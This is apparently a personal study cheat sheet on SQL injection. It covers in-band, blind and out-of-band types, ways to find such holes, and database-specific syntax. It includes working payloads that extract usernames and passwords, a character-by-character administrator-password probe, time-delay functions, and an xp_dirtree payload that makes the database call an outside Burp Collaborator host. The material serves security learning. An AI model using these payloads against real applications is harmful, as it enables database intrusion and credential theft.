### Table of Contents
1. Types of SQL Injections
2. Finding SQLi Vulnerabilities
3. Exploiting Tactics
4. Things to keep in mind (where you're injecting)
5. Tricks
6. DB Differences

### Useful Tools
[Sqlmap]: https://github.com/sqlmapproject/sqlmap

---------------------------------------------------------------
---------------------------------------------------------------

# 1. Types of SQL Injections
```
               -----------------
               | SQL INJECTION |
               -----------------
                       |
           ____________|________________________________
          |                        |                   |
  -------------------     ---------------------   -------------
  |IN-BAND (CLASSIC)|     |INFERENTIAL (BLIND)|   |OUT-OF-BAND|
  -------------------     ---------------------   -------------
          |                        |
   _______|_______         ________|________
  |              |         |               |
-------       -------  ---------         ------
|ERROR|       |UNION|  |BOOLEAN|         |TIME|
-------       -------  ---------         ------
```

+ `In-Band (Classic)`: Attack uses the **same channel** to **attack & gather results**
 - **Error**: Where you get _server_ to give an `error` to know how things
              work in _back-end_
            
- - - - - - -

 - **Union**: leverages the `UNION` operator to _combine_ reults of `2+ queries`
              into a _single result_
              
  * Example Payload: `www.random.com/app.php?id=' UNION SELECT username, password FROM users--`

- - - - - - - - - - - - - -

+ `Inferential (Blind)`: No transfer of data to application (don't see the results).
 - Look for things like **ORDER BY** clause

 - **Boolean Based SQL Injection**: Ask _true or false_ questions 

  * See if the responses are different for payload 1 & 2
  
  * Example Payload 1: `www.random.com/app.php?id=1 and 1=2`
  * Example Backend query 1: `select title from product where id =1 and 1=2`
  
  * Example Payload 1: `www.random.com/app.php?id=1 and 1=1`
  * Example Backend query 1: `select title from product where id =1 and 1=1`
 
  * Example Payload 3: `www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Adminstrator'), 1, 1) = 's'`
 
- - - - - - -

 - **Time Based SQL Injection**: Make DB pause for a period time 


- - - - - - - - - - - - - -

+ `Out-ofBand`: **Cannot** use **same channel** for attack. Relies of app's ability to 
                make a network connection (such as DNS or HTTP)

 - Example Payload: `'; exec master..xpdirtree '//random.burpcollaborator.net/a'--`


-------------------------------------------------------------------------
-------------------------------------------------------------------------


# 2. Finding SQLi Vulnerabilities

**Black Box Testing**
+ Mapp application

+ Fuzz the application
 - [ ] Submit _SQL-specific charcters_ such as `'` & `"` and
   look for _error/anomalies_
   
+ Submit _boolean_ conditions such as `OR 1=1` and `OR 1=2`,
  and look for _differences in the applications's responses_
  
+ Submit payloads to trigger _time delays_

+ Submit `OAST payloads` to trigger _out-of-band network interaction_
  when executed within a `SQL Query`, and monitor interactions

- - - - - - - - - - - - - - - - - - - - - - - - - - - -

**White Box Testing**
+ Enable _Web Server Logging_
+ Enable _Database Logging_
+ Mapp application
 - Visible functionality in the application
 - _Regex search_ on all instances in _code that talk to DB_
+ Code Review
 - Follow code path for all input vectors


-------------------------------------------------------------------------
-------------------------------------------------------------------------


# 3. Exploiting Tactics

- - - - - - - - - - - - - -

### Error-Based SQLi
+ Submit SQL-specific characters such as `'` or `"` and look for errors/anamolies
+ Different characters can give you different errors

- - - - - - - - - - - - - -

### Union-Based SQLi


   **Rules when using UNION operator**
   
[2 rules]: When COMBINING the results of 2 queries by using UNION
  1. `Number` and the `order` of the _columns_ must be the same in all queries
  2. `Data types` must be **compatible**

    **Background (Union)**
```
table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Intersting Query: select a, b from table1 UNION select usernames,passwords from USERS
```


   **========== Exploitation ==========**

1. Figure out the **number of columns** that query is making...
  + Use the **ORDER BY** clause
   - Incrment until and _error_ or you observe a _different behavior_
    * Maybe a `200 response` when correct
  + Example Back-end Query: `select title, cost from product where id =1 order by 1`
  
    ```Example_Attacker_Input
    order by 1--
    order by 2--
    order by 3-- <-- if this errors, you know there's 2 columns
    ```
  
  + Use the **NULL VALUES**
   - Increment number of _null vallues_ until you _no longer_ get an _error_
    * Maybe a `200 response` when correct
   - Example Back-end Query: `select title, cost from product where id =1 UNION SELECT NULL--`
   
     ```Example_Attacker_Input
     ' UNION SELECT NULL--           <--- this errors
     ' UNION SELECT NULL, NULL--     <--- NO ERROR (we know there are 2 columns)
     ```

- - - - - - -

2. Figure out the **data types** of _columns_ (`mainy interested in strings`)
  + Can use _INT_ to get _ASCII representation of string_

  + Use the `UNION` operator to _output info from the DB_
   - Example:
   ```
   ' UNION SELECT 'a', NULL--     <-- Conversion failed to covert 'a' to int
   ' UNION SELECT NULL, 'a'--     <-- If it doesn't you found it
                                    If nothing, you you're limited
   ```

- - - - - - - - - - - - - -

### Boolean Based Blind-Sqli
1. Submit a `boolean` condition that evaluates to `FALSE`
  + Note the response
2. Submit a `boolean` condition that evaluates to `TRUE`
  + Note the response
3. Write a program that uses `conditional statements` to as DB series of
   **True/False questions and monitor the respone**

- - - - - - - - - - - - - -

### Time Based Blind-Sqli
1. Submit payload that **pauses** the app for a specified period
2. Write a program that uses `conditional statements` to as DB series of
   **True/False questions and monitor the respone TIME**

- - - - - - - - - - - - - -

### Out-of-Band SQLi
1. Submit **OAST payloads** designed to trigger `out-of-band network interaction`
   when executed with a `SQL query`
  + Monitor the results

2. Depending on `SQL Injection` use different **method to exfiltrate data**

-------------------------------------------------------------------------
-------------------------------------------------------------------------

# 4. Things to keep in mind (where you're injecting)

1. Is user input in a **WHERE clause** 
  + Are you _searching a `keyword`_ like a:
   - _search engine_
   - _username/password_
   - etc.

2. Is user input in a **ORDER BY clause**
  + May need to do `Blind SQLi`

-------------------------------------------------------------------------
-------------------------------------------------------------------------

# 5. Tricks

1. Try using the `'` or `"` to see if you can break out of a string
  + See if there is a server error
  + Try using `'--` or `"--` to resolve server error
   - `--` is the _comment_ symbol for _SQL_

2. When using **BURP**, hit `Ctrl+u` to `URL encode` your payload

-------------------------------------------------------------------------
-------------------------------------------------------------------------

# 6. DB Differences

[Portswigger Cheat Sheet]: https://portswigger.net/web-security/sql-injection/cheat-sheet

**Oracle**
[Version]: SELECT banner from v$version
+ `SELECT` statement **MUST HAVE** a `FROM` clause
+ Oracle has a **DUAL table** which is a _special table_
 - Belongs to the _schema_ of the user `SYS` 
 - Accessible to _all users_

**DNS LOOKUP**
+ Observe Cheat Sheet

**COMMENTS**
```
Oracle      --comment

Microsoft   --comment
            /*comment*/
            
PostgreSQL  --comment
            /*comment*/
            
MySQL       #comment
            -- comment [Note the space after the double dash]
            /*comment*/
```

**DB VERSION**
```
Oracle	     SELECT banner FROM v$version
             SELECT version FROM v$instance
             
Microsoft	 SELECT @@version

PostgreSQL	 SELECT version()

MySQL	     SELECT @@version
```

**TABLE NAMES**

```
# Oracle
SELECT * FROM all_tables
        
# Microsoft
SELECT * FROM information_schema.tables

# PostgreSQL
SELECT * FROM information_schema.tables
SELECT table_name FROM information_schema.tables -- lists table names

# MySQL
SELECT * FROM information_schema.tables
```

**COLUMN NAMES**

```
# Oracle
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
        
# Microsoft
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

# PostgreSQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

# MySQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-
```

**TIME DELAYS**

```
Oracle          dbms_pipe.receive_message(('a'),10)
Microsoft       WAITFOR DELAY '0:0:10'
PostgreSQL      SELECT pg_sleep(10)
MySQL           SELECT sleep(10)
```





